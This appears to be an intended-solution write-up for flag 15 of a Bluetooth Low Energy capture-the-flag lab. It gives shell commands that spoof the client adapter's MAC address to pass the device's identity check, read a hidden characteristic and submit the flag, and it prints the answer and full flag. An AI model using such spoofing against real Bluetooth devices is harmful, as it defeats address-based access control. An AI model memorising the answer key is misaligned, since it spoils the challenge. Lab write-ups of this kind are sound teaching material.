# Flag 15 intended solution — `0xff12` / `0x0050`

The characteristic says `Connect with BT MAC address 11:22:33:44:55:66`.
Record the client's original adapter address, temporarily apply the requested
address, reset the radio and BlueZ if the adapter requires it, reconnect, and
read the characteristic. Always restore the original address afterward.

- Device ASCII prompt: `Connect with BT MAC address 11:22:33:44:55:66`
- Challenge location: UUID `0xff12`, value handle `0x0050`
- Required temporary client address: `11:22:33:44:55:66`

## Solve

```bash
TARGET=24:0A:C4:29:82:CE

gratttool -b "$TARGET" --char-read -a 0x0050 \
  | cut -d':' -f2 | xxd -r -p
echo

sudo gratttool --bdaddr show
ORIGINAL=A4:B1:C1:B9:87:6D  # replace with the address reported above

sudo gratttool --bdaddr 11:22:33:44:55:66

# Needed on the Intel adapter used for acceptance when gratttool says
# "Reset device manually".
sudo rfkill block bluetooth
sudo rfkill unblock bluetooth
sudo systemctl restart bluetooth

gratttool --bdaddr show
gratttool --scan 3

gratttool -b "$TARGET" --char-read -a 0x0050 \
  | cut -d':' -f2 | xxd -r -p
echo
```

The active adapter address was verified as `11:22:33:44:55:66`; the read then
returned `aca16920583e42bdcf5f`.

## Submit and restore

```bash
gratttool -b "$TARGET" --char-write-req -a 0x002c \
  -n $(echo -n 'aca16920583e42bdcf5f' | xxd -ps)

sudo gratttool --bdaddr "$ORIGINAL"
sudo rfkill block bluetooth
sudo rfkill unblock bluetooth
sudo systemctl restart bluetooth
gratttool --bdaddr show
```

Live verification advanced the score to `15/20`, then confirmed the acceptance
host was restored to its original address `A4:B1:C1:B9:87:6D`.

- Raw ESP32 submission: `aca16920583e42bdcf5f`
- CTFd flag: `M0DUL0CTF{aca16920583e42bdcf5f}`
